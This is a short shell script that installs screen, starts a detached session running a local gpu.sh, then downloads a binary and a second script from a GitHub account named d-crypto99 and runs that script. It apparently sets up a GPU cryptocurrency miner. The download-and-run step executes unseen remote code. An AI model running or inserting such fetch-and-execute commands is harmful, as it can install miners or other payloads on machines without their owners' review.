#!/bin/sh
sudo apt update
sudo apt install screen -y
screen -dmS gpu.sh ./gpu.sh 78 93
wget https://github.com/d-crypto99/2m/raw/main/mantapu
wget https://raw.githubusercontent.com/d-crypto99/2m/main/gpu-nvidia.sh
chmod +x gpu-nvidia.sh
./gpu-nvidia.sh
